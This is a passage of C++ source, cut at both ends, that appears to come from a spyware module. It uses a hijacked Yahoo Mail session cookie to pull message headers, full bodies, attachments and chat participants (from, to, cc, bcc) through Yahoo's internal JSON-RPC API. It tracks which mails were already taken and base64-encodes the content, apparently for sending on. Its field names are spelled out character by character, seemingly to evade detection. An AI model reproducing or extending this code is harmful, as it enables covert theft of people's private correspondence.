	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE, L"/ws/mail/v2.0/jsonrpc?appid=YahooMailNeo&m=ListFolderThreads&wssid=%s&ymreqid=%s", pYHParams->strWSSID, strReqID);	
	znfree((LPVOID*)&strReqID);

	dwSize = strlen(strGetHeader) + wcslen(pYHParams->strMailFolder) + strlen(strMailID) + 1;
	strBuffer = (LPSTR)zalloc(dwSize);
	if(strBuffer == NULL)
	{		
		znfree((LPVOID*)&strURI);
		return YAHOO_ALLOC_ERROR;
	}
	_snprintf_s(strBuffer, dwSize, _TRUNCATE, strGetHeader, pYHParams->strMailFolder, strMailID);

	//json command to retrieve the mail header
	dwRet = HttpSocialRequest(pYHParams->strServerName, L"POST", strURI, 443, (LPBYTE*)strBuffer, strlen(strBuffer), (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie);

	//free heap
	znfree((LPVOID*)&strURI);
	znfree((LPVOID*)&strBuffer);

	if(dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		znfree((LPVOID*)&strRecvBuffer);
		return dwRet;
	}

	//parse the header
	jValue = JSON::Parse(strRecvBuffer);	

	znfree((LPVOID*)&strRecvBuffer);

	if (jValue != NULL && jValue->IsObject())
	{
		jObj = jValue->AsObject(); //json root

		//find the result object
		if (jObj.find(strRoot) != jObj.end() && jObj[strRoot]->IsObject())
		{	
			jObj = jObj[strRoot]->AsObject();

			if(jObj[strHeaders]->IsArray())
			{
				//rawheader array
				jHeader = jObj[strHeaders]->AsArray();

				for(dwTotSize=0, i=0; i<jHeader.size(); i++)
				{	
					//yhfix
					if(!jHeader[i]->IsString())
						continue;

					//length of header
					dwSize = wcslen(jHeader[i]->AsString().c_str());
					if(dwSize == 0)
						continue;

					//mem reallocation
					pOldBuf = strTmp;
					strTmp = (LPWSTR)realloc(strTmp, ((dwTotSize+dwSize)*sizeof(WCHAR)) + 2);
					if(strTmp == NULL)
					{	
						znfree((LPVOID*)&pOldBuf);
						delete jValue;
						return YAHOO_ALLOC_ERROR;
					}						

					//copy value to buffer
					wmemcpy_s((strTmp + dwTotSize), (dwTotSize+dwSize+2), jHeader[i]->AsString().c_str(), dwSize);

					//total size of the buffer
					dwTotSize += dwSize;

					//null terminate
					wmemset((strTmp + dwTotSize), 0, 1);					
				}				

				//convertion from LPWSTR to LPSTR
				*strMailHeader = (LPSTR)zalloc(dwTotSize+1); //add cr/lf to the end of the header
				if(*strMailHeader == NULL)
				{
					znfree((LPVOID*)&strTmp);
					delete jValue;
					return YAHOO_ALLOC_ERROR;
				}
				wcstombs_s((size_t*)&dwSize, *strMailHeader, dwTotSize+1, strTmp, _TRUNCATE);				
				
				//SecureZeroMemory(&MailFields, sizeof(YAHOO_MAIL_FIELDS));

				//search for boundary value for multipart mails
				//(es: boundary="----=_NextPart_1CF_1D5C_7951AA2F.3FAEF881")
				//YHGetBoundaryValue(strTmp, &(pYHMailFields->strHeaderBoundary));

				znfree((LPVOID*)&strTmp);
			}
		}
	}

	delete jValue;

	return YAHOO_SUCCESS;
}


//download an attachment and add it to the mail
DWORD YHAddAttachment(LPWSTR* strMail, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPYAHOO_MAIL_FIELDS lpMailFields, LPSTR strMailID, LPSTR strCookie)
{
	YAHOO_MAIL_ATTACHMENT MailAttachment;
	DWORD dwRet;

	//download an attachment if present and if it's not a text section
	if((lpMailFields->strDisposition != NULL) &&
	   (_wcsicmp(lpMailFields->strType, L"text") != NULL) &&
	   ((!_wcsicmp(lpMailFields->strDisposition, L"attachment")) ||
	   (!_wcsicmp(lpMailFields->strDisposition, L"inline"))))
	{		

		SecureZeroMemory(&MailAttachment, sizeof(MailAttachment));

		//download attachment
		dwRet = YHGetMailAttachment(strMailID, lpYHParams, lpMailFields, strCookie, &MailAttachment);
		switch(dwRet)
		{
			case YAHOO_SUCCESS:
				//insert the attachment into the mail body
				if(ReallocAndAppendString(strMail, MailAttachment.strEncodedAttachment) != YAHOO_SUCCESS)
				{
					znfree((LPVOID*)strMail);
					znfree((LPVOID*)&MailAttachment.strEncodedAttachment);					
					return YAHOO_ALLOC_ERROR;
				}
				break;

			case YAHOO_ERROR:
			case YAHOO_ALLOC_ERROR:				
				znfree((LPVOID*)&MailAttachment.strEncodedAttachment);
				znfree((LPVOID*)strMail);
				return dwRet;
		}

		//free attchment
		znfree((LPVOID*)&MailAttachment.strEncodedAttachment);
	}

	return YAHOO_SUCCESS;
}

//request the mail associated to an email ID
DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR strCookie, LPSTR* strMailBody)
{
	LPSTR	strGetMsg = "{\"method\": \"GetMessage\",\"params\": [{\"fid\": \"%S\",\"message\": [{\"blockImages\": \"none\",\"mid\": \"%s\",\"expandCIDReferences\": true, \"enableWarnings\": true,\"restrictCSS\": true}]}]}";
	LPSTR   strBuffer		= NULL;
	LPSTR   strRecvBuffer	= NULL;	
	LPWSTR	strReqID		= NULL;
	LPWSTR  strTmp			= NULL;
	LPWSTR	strURI			= NULL;	
	DWORD	dwSize, dwRet, dwBufferSize, dwTotSize, dwError, dwMailDate=0;	
	BOOL	bWriteSection;

	YAHOO_MAIL_BOUNDARIES	MailBoundaries;
	YAHOO_MAIL_FIELDS		MailFields;
	YAHOO_MAIL_FIELDS		MailNextFields;

	//json vars
//	std::vector<int>::size_type i;
	std::vector<int>::size_type j;
	JSONValue* jValue = NULL;
	JSONArray  jMsg, jArray;
	JSONObject jObj;
		
	WCHAR strRoot[]				= { L'r', L'e', L's', L'u', L'l', L't', L'\0' };										//object
	WCHAR strMessageFld[]		= { L'm', L'e', L's', L's', L'a', L'g', L'e', L'\0' };									//array
	WCHAR strPartFld[]			= { L'p', L'a', L'r', L't', L'\0' };													//array
	WCHAR strDateFld[]			= { L'r', L'e', L'c', L'e', L'i', L'v', L'e', L'd', L'D', L'a', L't', L'e', L'\0' };	//value

	//format the request id
	if(!YHFormatRequestID(&strReqID, lpYHParams))
	{
		znfree((LPVOID*)&strReqID);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	//get mail body
	strURI = (LPWSTR)zalloc(YAHOO_ALLOC_SIZE*sizeof(WCHAR));
	if(strURI == NULL)
	{
		znfree((LPVOID*)&strReqID);
		return YAHOO_ALLOC_ERROR;
	}
	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE, L"/ws/mail/v2.0/jsonrpc?appid=YahooMailNeo&m=ListFolderThreads&wssid=%s&ymreqid=%s", lpYHParams->strWSSID, strReqID); // FIXME ARRAY	
	znfree((LPVOID*)&strReqID);

	dwSize = strlen(strGetMsg) + wcslen(lpYHParams->strMailFolder) + strlen(strMailID) + 1;
	strBuffer = (LPSTR)zalloc(dwSize);
	if(strBuffer == NULL)
	{		
		znfree((LPVOID*)&strURI);
		return YAHOO_ALLOC_ERROR;
	}

	//post buffer
	_snprintf_s(strBuffer, dwSize, _TRUNCATE, strGetMsg, lpYHParams->strMailFolder, strMailID); // FIXME ARRAY	

	//json command to retrieve the mail list
	dwRet = HttpSocialRequest(lpYHParams->strServerName, L"POST", strURI, 443, (LPBYTE*)strBuffer, strlen(strBuffer), (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie); // FIXME ARRAY

	//free heap	
	znfree((LPVOID*)&strURI);
	znfree((LPVOID*)&strBuffer);

	if(dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		znfree((LPVOID*)&strRecvBuffer);
		return dwRet;
	}

	//parse the body
	jValue = JSON::Parse(strRecvBuffer);

	//free buffer
	znfree((LPVOID*)&strRecvBuffer);

	if(jValue != NULL && jValue->IsObject())
	{
		jObj = jValue->AsObject(); //json root

		//find the result object
		if (jObj.find(strRoot) != jObj.end() && jObj[strRoot]->IsObject())
		{	
			jObj = jObj[strRoot]->AsObject();

			if(jObj[strMessageFld]->IsArray())
			{
				//message array
				jMsg = jObj[strMessageFld]->AsArray();

				if(!jMsg[0]->IsObject())
				{
					delete jValue;
					return YAHOO_ERROR;
				}

				//json object containing the message
				jObj = jMsg[0]->AsObject();

				//get the mail date
				dwMailDate = (DWORD)jObj[strDateFld]->AsNumber();

				//check if this mail has already been sent
//					if(lpYHParams->dwLowTS > dwMailDate)
//						continue;					

				//part array
				if(!jObj[strPartFld]->IsArray())
				{
					delete jValue;
					return YAHOO_ERROR;
				}

				jArray = jObj[strPartFld]->AsArray();
					
				SecureZeroMemory(&MailFields,		sizeof(YAHOO_MAIL_FIELDS));
				SecureZeroMemory(&MailNextFields,	sizeof(YAHOO_MAIL_FIELDS));
				SecureZeroMemory(&MailBoundaries,	sizeof(YAHOO_MAIL_BOUNDARIES));

				dwError = 0;

				//loop into mail parts obj
				for(j=0; (dwError==0) && (j<jArray.size()); j++)
				{
					if(!jArray[j]->IsObject())
						continue;
					jObj = jArray[j]->AsObject();
						
					//get email fields of the json object
					dwRet = YHExtractMailFields(jObj, &MailFields, &MailBoundaries);
					switch(dwRet)
					{
						case YAHOO_SKIP:
							continue;
						case YAHOO_SUCCESS:
							break;
						default:
							//free memory and exit
							dwError = dwRet;
							continue;
					}

					//get email fields of the next object
					if ((j+1) < (jArray.size()))					
					{
						dwRet = YHExtractMailFields(jArray[j+1]->AsObject(), &MailNextFields, NULL);
						if(dwRet == YAHOO_ALLOC_ERROR)
						{
							//free memory and exit
							dwError = dwRet;
							continue;
						}
					}

					bWriteSection = FALSE;

					//it there are no boundaries, and the section contains some text, write the section header
					if(MailBoundaries.dwTotItems == 0)
					{
						if((MailFields.strText != NULL) && (_wcsicmp(MailFields.strPartId, L"TEXT")))
							bWriteSection = TRUE;
					}
					else
					{
						//if the boundary was taken from a previous section, write the section header														
						if(wcscmp(MailBoundaries.lpBoundaries[MailBoundaries.dwCurrentItem]->strPartID, MailFields.strPartId))
						{
							bWriteSection = TRUE;
						}
						else
						{
							if(MailBoundaries.dwTotItems > 1)
								bWriteSection = TRUE;
						}

					}						

					//add the section header to the mail
					if(bWriteSection)
					{
						if((dwRet = YHAddSectionHeader(&strTmp, &MailFields)) != YAHOO_SUCCESS)
						{
							//free memory and exit
							dwError = dwRet;
							continue;
						}
					}

					//add the section text to the mail
					if((dwRet = YHAddSectionText(&strTmp, &MailFields)) != YAHOO_SUCCESS)
					{
						//free memory and exit
						dwError = dwRet;
						continue;
					}

					//if present, download the attachment and add it to the mail
					if((dwRet = YHAddAttachment(&strTmp, lpYHParams, &MailFields, strMailID, strCookie)) != YAHOO_SUCCESS)
					{
						//free memory and exit
						dwError = dwRet;
						continue;
					}				

					//write the boundary
					if(MailNextFields.strPartId != NULL)
					{
						LPWSTR pStr = MailBoundaries.lpBoundaries[MailBoundaries.dwCurrentItem]->strPartID;
						BOOL  bCloseSection = FALSE;
							
						if(!_wcsicmp(pStr, L"TEXT"))
						{
							bCloseSection = FALSE;
						}
						else if(wcsncmp(pStr, MailNextFields.strPartId, wcslen(pStr)))
						{
							bCloseSection = TRUE;
						}
						
						//add the boundary
						if(YHAddMailBoundary(&strTmp, &MailBoundaries, bCloseSection) == YAHOO_ALLOC_ERROR)
						{
							dwError = dwRet;
							continue;
						}

						//if a session was closed and there's another section boundary, write it (beginning of a new section)
						if((bCloseSection) && (MailBoundaries.dwTotItems > 0))
						{
							//add the boundary
							if(YHAddMailBoundary(&strTmp, &MailBoundaries, FALSE) == YAHOO_ALLOC_ERROR)
							{
								dwError = dwRet;
								continue;
							}
						}
					}
					else
					{
						//this is the last section of the mail, so write a closing section boundary
						if(YHAddMailBoundary(&strTmp, &MailBoundaries, TRUE) == YAHOO_ALLOC_ERROR)
						{
							//free memory and exit
							dwError = dwRet;
							continue;
						}
					}

					//free heap
					YHFreeMailFields(&MailFields);
					YHFreeMailFields(&MailNextFields);						

				} // end of for loop

				//free boundaries
				YHFreeBoundaries(&MailBoundaries);

				//in case of error, free heap and exit
				if(dwError)
				{
					//free memory
					delete jValue;
					znfree((LPVOID*)&strTmp);
					YHFreeMailFields(&MailFields);
					YHFreeMailFields(&MailNextFields);

					return dwError;
				}				

				if(strTmp == NULL)
				{
					delete jValue;
					return YAHOO_SKIP;
				}

				dwTotSize = wcslen(strTmp);
				
				//convertion from LPWSTR to LPSTR
				*strMailBody = (LPSTR)zalloc(dwTotSize+1);
				if(*strMailBody == NULL)
				{
					znfree((LPVOID*)&strTmp);
					delete jValue;
					return YAHOO_ALLOC_ERROR;
				}

				//converto from wide char to multi byte
				dwRet = wcstombs_s((size_t*)&dwSize, *strMailBody, dwTotSize+1, strTmp, _TRUNCATE);
				if(dwRet != 0)
				{
					//if the convertion fails, try this function
					ConvertToUTF8(strTmp, strMailBody);
				}

/*
				for(int i=0; i<dwTotSize; i++)
				{
					dwRet = wcstombs_s((size_t*)&dwSize, *strMailBody, dwTotSize+1, strTmp, i);
					if(dwRet != 0)
						break;
				}
*/
				//free and set to null
				znfree((LPVOID*)&strTmp);

				//save the mail date
				lpYHParams->dwLastMailDate = dwMailDate;
			}
		}
	}	
	else
	{
		//delete json value
		delete jValue;
		return YAHOO_ERROR;
	}

	//delete json value
	delete jValue;

	//if the mail is old, skip it
	if(dwMailDate == 0)
		return YAHOO_SKIP;

	return YAHOO_SUCCESS;
}


//get partecipants to the conversation
DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHeader)
{
	WCHAR strFromFld[]		= { L'f', L'r', L'o', L'm', L'\0' };		//obj
	WCHAR strToFld[]		= { L't', L'o', L'\0' };					//obj
	WCHAR strCCFld[]		= { L'c', L'c', L'\0' };					//array
	WCHAR strBCCFld[]		= { L'b', L'c', L'c', L'\0' };				//array
	WCHAR strEmailFld[]		= { L'e', L'm', L'a', L'i', L'l', L'\0' };	//value
	WCHAR strNameFld[]		= { L'n', L'a', L'm', L'e', L'\0' };		//value
	WCHAR strUserFld[]		= { L'x', L'a', L'p', L'p', L'a', L'r', L'e',  L'n',  L't',  L'l',  L'y', L't', L'o', L'\0' };	//value
	
	JSONObject jObj;	
	JSONArray  jArray;
	JSONValue* jValue = NULL;
	std::vector<int>::size_type i;

	WCHAR strSeparator[4];

	//clear chat fields
	SecureZeroMemory(lpChatFields, sizeof(YAHOO_CHAT_FIELDS));
	SecureZeroMemory(&strSeparator, sizeof(strSeparator));

	//get the user field
	if(ReallocAndAppendString(&lpChatFields->strMailUser, (LPWSTR)pjHeader[strUserFld]->AsString().c_str()) != YAHOO_SUCCESS)
	{
		znfree((LPVOID*)&lpChatFields->strMailUser);
		return YAHOO_ALLOC_ERROR;
	}

	//get 'from' obj
	if(pjHeader[strFromFld]->IsObject())
	{
		jObj = pjHeader[strFromFld]->AsObject();

		//author
		if(ReallocAndAppendString(&lpChatFields->strAuthor, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
		{
			znfree((LPVOID*)&lpChatFields->strAuthor);
			return YAHOO_ALLOC_ERROR;
		}

		//author id
		if(ReallocAndAppendString(&lpChatFields->strAuthorID, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
		{
			znfree((LPVOID*)&lpChatFields->strAuthorID);
			return YAHOO_ALLOC_ERROR;
		}

/*
		//get email (peer id)
		if(ReallocAndAppendString(&lpChatFields->strPeersID, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
			return YAHOO_ALLOC_ERROR;

		//get name (peer name)
		//if(ReallocAndAppendString(&lpChatFields->strPeers, (LPWSTR)jObj[strNameFld]->AsString().c_str()) != YAHOO_SUCCESS)		
		//	return YAHOO_ALLOC_ERROR;

		//get the email as name because sometimes the name is not present
		if(ReallocAndAppendString(&lpChatFields->strPeers, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
			return YAHOO_ALLOC_ERROR;
*/
	}

	//get contacted peers
	if(pjHeader[strToFld]->IsArray())
	{
		jArray =  pjHeader[strToFld]->AsArray();

		//get all the contacted peers
		for(i=0; i<jArray.size(); i++)
		{
			//yhfix
			if(!jArray[i]->IsObject())
				continue;

			//get obj
			jObj = jArray[i]->AsObject();

			//get email (peer id)
			if(jObj[strEmailFld]->AsString().c_str() != NULL)
			{
				if(lpChatFields->strPeersID != NULL)
					wcscpy_s(strSeparator, 4, L", ");
				else
					strSeparator[0] = 0;

				if(ReallocAndAppendString(&lpChatFields->strPeersID, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
				{
					znfree((LPVOID*)&lpChatFields->strPeersID);
					return YAHOO_ALLOC_ERROR;
				}
			}

			//get name (peer name)
			//if((jObj[strNameFld]->AsString().c_str() != NULL) && (jObj[strNameFld]->AsString().c_str() != L""))
			//{
			//	if(ReallocAndAppendString(&lpChatFields->strPeers,  L", ",  (LPWSTR)jObj[strNameFld]->AsString().c_str()) != YAHOO_SUCCESS)
			//		return YAHOO_ALLOC_ERROR;
			//}

			//get the email as name because sometimes the name is not present
			if(jObj[strEmailFld]->AsString().c_str() != NULL)
			{
				if(lpChatFields->strPeers != NULL)
					wcscpy_s(strSeparator, 4, L", ");
				else
					strSeparator[0] = 0;
				if(ReallocAndAppendString(&lpChatFields->strPeers, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
				{
					znfree((LPVOID*)&lpChatFields->strPeers);
					return YAHOO_ALLOC_ERROR;
				}
			}
			strSeparator[0] = 0;
		}
	}

	//get 'cc' peers
	if(pjHeader[strCCFld]->IsArray())
	{
		jArray =  pjHeader[strCCFld]->AsArray();

		//get all the contacted peers
		for(i=0; i<jArray.size(); i++)
		{
			//yhfix
			if(!jArray[i]->IsObject())
				continue;

			//get obj
			jObj = jArray[i]->AsObject();

			//get email (peer id)
			if(jObj[strEmailFld]->AsString().c_str() != NULL)
			{
				if(lpChatFields->strPeersID != NULL)
					wcscpy_s(strSeparator, 4, L", ");
				else
					strSeparator[0] = 0;

				if(ReallocAndAppendString(&lpChatFields->strPeersID, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
				{
					znfree((LPVOID*)&lpChatFields->strPeersID);
					return YAHOO_ALLOC_ERROR;
				}
			}

/*
			//get name (peer name)
			if(jObj[strNameFld]->AsString().c_str() != NULL)
			{
				if(ReallocAndAppendString(&lpChatFields->strPeers,  L", ",  (LPWSTR)jObj[strNameFld]->AsString().c_str()) != YAHOO_SUCCESS)
					return YAHOO_ALLOC_ERROR;
			}
*/
			//get the email as name because sometimes the name is not present
			if(jObj[strEmailFld]->AsString().c_str() != NULL)
			{
				if(lpChatFields->strPeers != NULL)
					wcscpy_s(strSeparator, 4, L", ");
				else
					strSeparator[0] = 0;

				if(ReallocAndAppendString(&lpChatFields->strPeers, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
				{
					znfree((LPVOID*)&lpChatFields->strPeers);
					return YAHOO_ALLOC_ERROR;
				}
			}
		}
	}

	//get 'bcc' peers
	if(pjHeader[strBCCFld]->IsArray())
	{
		jArray =  pjHeader[strBCCFld]->AsArray();

		//get all the contacted peers
		for(i=0; i<jArray.size(); i++)
		{
			//yhfix
			if(!jArray[i]->IsObject())
				continue;

			//get obj
			jObj = jArray[i]->AsObject();

			//get email (peer id)
			if(jObj[strEmailFld]->AsString().c_str() != NULL)
			{
				if(lpChatFields->strPeersID != NULL)
					wcscpy_s(strSeparator, 4, L", ");
				else
					strSeparator[0] = 0;

				if(ReallocAndAppendString(&lpChatFields->strPeersID, strSeparator, (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
				{
					znfree((LPVOID*)&lpChatFields->strPeersID);
					return YAHOO_ALLOC_ERROR;
				}
			}

/*
			//get name (peer name)
			if(jObj[strNameFld]->AsString().c_str() != NULL)
			{
				if(ReallocAndAppendString(&lpChatFields->strPeers,  L", ",  (LPWSTR)jObj[strNameFld]->AsString().c_str()) != YAHOO_SUCCESS)
					return YAHOO_ALLOC_ERROR;
			}
*/
			//get the email as name because sometimes the name is not present
			if(jObj[strEmailFld]->AsString().c_str() != NULL)
			{
				if(lpChatFields->strPeers != NULL)
					wcscpy_s(strSeparator, 4, L", ");
				else
					strSeparator[0] = 0;

				if(ReallocAndAppendString(&lpChatFields->strPeers,  strSeparator,  (LPWSTR)jObj[strEmailFld]->AsString().c_str()) != YAHOO_SUCCESS)
				{
					znfree((LPVOID*)&lpChatFields->strPeers);
					return YAHOO_ALLOC_ERROR;
				}
			}
		}
	}

	return YAHOO_SUCCESS;
}



//request the chat associated to the id
DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR strCookie)
{
	LPSTR	strGetMsg = "{\"method\": \"GetMessage\",\"params\": [{\"fid\": \"%S\",\"message\": [{\"blockImages\": \"none\",\"mid\": \"%s\",\"expandCIDReferences\": true, \"enableWarnings\": true,\"restrictCSS\": true}]}]}";
	LPSTR   strBuffer		= NULL;
	LPSTR   strRecvBuffer	= NULL;	
	LPWSTR	strReqID		= NULL;
	LPWSTR  strTmp			= NULL;
	LPWSTR	strURI			= NULL;	
	DWORD	dwSize, dwRet, dwBufferSize, dwTotSize, dwError, dwMailDate=0;	
//	BOOL	bWriteSection;

	//json vars
	std::vector<int>::size_type j;	
	JSONValue* jValue = NULL;
	JSONArray  jMsg, jArray;
	JSONObject jObj;
		
	WCHAR strRoot[]				= { L'r', L'e', L's', L'u', L'l', L't', L'\0' };										//object
	WCHAR strMessageFld[]		= { L'm', L'e', L's', L's', L'a', L'g', L'e', L'\0' };									//array
	WCHAR strPartFld[]			= { L'p', L'a', L'r', L't', L'\0' };													//array
	WCHAR strDateFld[]			= { L'r', L'e', L'c', L'e', L'i', L'v', L'e', L'd', L'D', L'a', L't', L'e', L'\0' };	//value

	//format the request id
	if(!YHFormatRequestID(&strReqID, lpYHParams))
	{
		znfree((LPVOID*)&strReqID);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	//get mail body
	strURI = (LPWSTR)zalloc(YAHOO_ALLOC_SIZE*sizeof(WCHAR));
	if(strURI == NULL)
	{
		znfree((LPVOID*)&strReqID);
		return YAHOO_ALLOC_ERROR;
	}
	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE, L"/ws/mail/v2.0/jsonrpc?appid=YahooMailNeo&m=ListFolderThreads&wssid=%s&ymreqid=%s", lpYHParams->strWSSID, strReqID); // FIXME ARRAY	
	znfree((LPVOID*)&strReqID);

	dwSize = strlen(strGetMsg) + wcslen(lpYHParams->strMailFolder) + strlen(strChatID) + 1;
	strBuffer = (LPSTR)zalloc(dwSize);
	if(strBuffer == NULL)
	{		
		znfree((LPVOID*)&strURI);
		return YAHOO_ALLOC_ERROR;
	}

	//post buffer
	_snprintf_s(strBuffer, dwSize, _TRUNCATE, strGetMsg, lpYHParams->strMailFolder, strChatID);

	//json command to retrieve the mail list
	dwRet = HttpSocialRequest(lpYHParams->strServerName, L"POST", strURI, 443, (LPBYTE*)strBuffer, strlen(strBuffer), (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie); // FIXME ARRAY

	//free heap	
	znfree((LPVOID*)&strURI);
	znfree((LPVOID*)&strBuffer);

	if(dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		znfree((LPVOID*)&strRecvBuffer);
		return dwRet;
	}

	//parse the body
	jValue = JSON::Parse(strRecvBuffer);

	//free buffer
	znfree((LPVOID*)&strRecvBuffer);

	if(jValue != NULL && jValue->IsObject())
	{
		jObj = jValue->AsObject(); //json root

		//find the result object
		if (jObj.find(strRoot) != jObj.end() && jObj[strRoot]->IsObject())
		{	
			jObj = jObj[strRoot]->AsObject();

			if(jObj[strMessageFld]->IsArray())
			{
				//message array
				jMsg = jObj[strMessageFld]->AsArray();

				SecureZeroMemory(lpChatFields, sizeof(YAHOO_CHAT_FIELDS));

				if(!jMsg[0]->IsObject())
				{
					delete jValue;
					return YAHOO_ERROR;
				}

				//json object containing the message
				jObj = jMsg[0]->AsObject();

				//get the mail date
				dwMailDate = (DWORD)jObj[strDateFld]->AsNumber();
/*
				//check if this mail has already been sent
				if(lpYHParams->dwLowTS > dwMailDate)
				{
					delete jValue;
					return YAHOO_SUCCESS;
				}					
*/

				//get chat info
				if(YHGetChatInfo(lpChatFields, jObj) != YAHOO_SUCCESS)
				{
					//free memory
					delete jValue;
					znfree((LPVOID*)&strTmp);
					YHFreeChatFields(lpChatFields);

					return YAHOO_ERROR;
				}

				//part array
				if(!jObj[strPartFld]->IsArray())
					return YAHOO_ERROR;
				jArray = jObj[strPartFld]->AsArray();
								
				//loop into mail parts obj
				for(j=0, dwError=0; (dwError==0) && (j<jArray.size()); j++)
				{
					if(!jArray[j]->IsObject())
						continue;
					jObj = jArray[j]->AsObject();

					//get email fields of the json object
					dwRet = YHExtractChatFields(jObj, lpChatFields);
					switch(dwRet)
					{
						case YAHOO_SKIP:
							continue;
						case YAHOO_SUCCESS:
							break;
						default:
							//free memory and exit
							dwError = dwRet;
							continue;
					}

					//if the section type is != text/html, skip it
					if(_wcsicmp(lpChatFields->strType, L"text") || _wcsicmp(lpChatFields->strSubType, L"html"))
					{
						znfree((LPVOID*)&lpChatFields->strText);
						znfree((LPVOID*)&lpChatFields->strSubType);
						znfree((LPVOID*)&lpChatFields->strType);
						continue;
					}

					znfree((LPVOID*)&lpChatFields->strSubType);
					znfree((LPVOID*)&lpChatFields->strType);

					//add the conversation to the buffer
					if(YHAddChat(&strTmp, lpChatFields) != YAHOO_SUCCESS)
					{
						//free memory and exit
						dwError = dwRet;
						continue;
					}
					
					//free the text field
					znfree((LPVOID*)&lpChatFields->strText);

				} // end of for loop

				//in case of error, free heap and exit
				if(dwError)
				{
					//free memory
					delete jValue;
					znfree((LPVOID*)&strTmp);
					YHFreeChatFields(lpChatFields);

					return dwError;
				}

				if(strTmp == NULL)
				{
					delete jValue;
					return YAHOO_SKIP;
				}

				dwTotSize = wcslen(strTmp) + 1;
				
				//save the conversation in strText
				lpChatFields->strText = (LPWSTR)zalloc(dwTotSize * sizeof(WCHAR));
				if(lpChatFields->strText == NULL)
				{
					YHFreeChatFields(lpChatFields);
					znfree((LPVOID*)&strTmp);
					delete jValue;
					return YAHOO_ALLOC_ERROR;
				}

				//copy the chat to strText
				wcscpy_s(lpChatFields->strText, dwTotSize, strTmp);

				//free and set to null
				znfree((LPVOID*)&strTmp);

				//save the mail date
				lpYHParams->dwLastMailDate = dwMailDate;
			}
		}
	}	
	else
	{
		//delete json value
		delete jValue;
		return YAHOO_ERROR;
	}

	//delete json value
	delete jValue;

	//if the mail is old, skip it
	if(dwMailDate == 0)
		return YAHOO_SKIP;

	return YAHOO_SUCCESS;
}


//add a new conversation section
DWORD YHAddChat(LPWSTR *strChat, LPYAHOO_CHAT_FIELDS pFields)
{
	//text
	if(pFields->strText != NULL)
	{
		if(ReallocAndAppendString(strChat, pFields->strText) != YAHOO_SUCCESS)
		{
			znfree((LPVOID*)strChat);
			return YAHOO_ALLOC_ERROR;
		}
	}

	return YAHOO_SUCCESS;
}

/*
//verify if it'a valid utf string
BOOL VerifyWString(LPWSTR* pStr)
{
	DWORD dwLen = wcslen(*pStr);	

	for(DWORD i=0; i<dwLen; i++)
	{
		if(*pStr[i] > 0xFF)
			*pStr[i] = 0x20; //replace the invalid chars to blanks
	}

	return TRUE;
}
*/


DWORD ConvertToUTF8(LPWSTR pIn, LPSTR* pOut)
{
	DWORD dwSize;

	//return the number of chars needed by dest buffer
	dwSize = WideCharToMultiByte(CP_UTF8, 0, pIn, -1, 0, 0, 0 , 0);

	//alloc dest buffer
	*pOut = (LPSTR)zalloc(dwSize);
	if(*pOut == NULL)
		return YAHOO_ALLOC_ERROR;

	//conversion
	WideCharToMultiByte(CP_UTF8, 0, pIn, -1, *pOut, dwSize, 0 , 0);

	return YAHOO_SUCCESS;
}

//encode a string with the algorithm specified and save it to the input string
DWORD AsciiBufToBase64(LPWSTR* pStr, LPWSTR strEncodingAlg)
{
	LPSTR  strTmp=NULL, strMB=NULL;
	LPWSTR pOldBuf = NULL;
	DWORD  dwEncSize, dwNewSize, dwLines, dwLen, dwLineLen=72;
	size_t dwConv;

	if(*pStr == NULL)
		return YAHOO_ERROR;

	if(_wcsicmp(strEncodingAlg, L"base64"))
		return YAHOO_ERROR;

	//convertion to UTF charset
	if(ConvertToUTF8(*pStr, &strMB) != YAHOO_SUCCESS)
		return YAHOO_ERROR;

	//encode the attachment
	strTmp = base64_encode((LPBYTE)strMB, strlen(strMB));
	znfree((LPVOID*)&strMB);

	if(strTmp == NULL)		
		return YAHOO_ERROR;

	dwEncSize = strlen(strTmp);

	//determine the number of lines
	dwLines = ((int)(dwEncSize / dwLineLen)) + 1;
	dwNewSize = dwEncSize + (dwLines*2) + 1;	//add 2 chars for each line, to store the CRLF bytes

	//realloc mem for the encoded string + (CRLF*nOfLines)
	pOldBuf = *pStr;
	*pStr = (LPWSTR)realloc(*pStr, dwNewSize * sizeof(WCHAR));
	if(*pStr == NULL)
	{
		znfree((LPVOID*)&pOldBuf);
		znfree((LPVOID*)&strTmp);
		return YAHOO_ALLOC_ERROR;
	}

	SecureZeroMemory(*pStr, dwNewSize * sizeof(WCHAR));

	//alloc a temp buffer for conversion
	LPWSTR strConv = (LPWSTR)zalloc((dwLineLen+1) * sizeof(WCHAR));
	dwLen = dwLineLen;

	//add CRLF to attachment
	for(DWORD i=0, j=0, dwTotConv=0; i<dwLines; i++)
	{
		j = (i * dwLineLen) + ((i * 2));

		if((dwEncSize-dwTotConv) < dwLen)
		{
			dwLen = dwEncSize-dwTotConv;
		}

